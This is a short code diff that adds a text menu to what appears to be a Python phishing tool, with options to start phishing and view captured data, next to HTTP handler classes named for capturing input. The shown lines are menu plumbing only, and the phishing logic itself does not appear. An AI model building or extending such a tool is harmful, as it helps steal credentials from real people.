@@ -123,6 +123,28 @@ class MyHandler(http.server.SimpleHTTPRequestHandler):
             self.wfile.write(b"Captured")
 
 
+# Main menu function
+def main():
+    while True:
+        print("\n[1] Start Phishing")
+        print("[2] View Captured Data")
+        print("[3] Exit")
+        choice = input("Enter your choice: ")
+
+        if choice == "1":
+            start_phishing()
+        elif choice == "2":
+            view_captured_data()
+        elif choice == "3":
+            print("[!] Exiting...")
+            sys.exit()
+        else:
+            print("[!] Invalid choice, try again.")
+
+# Run the script
+if __name__ == "__main__":
+    show_banner()
+    main()
 
 class PhishingHandler(BaseHTTPRequestHandler):
     def do_GET(self):
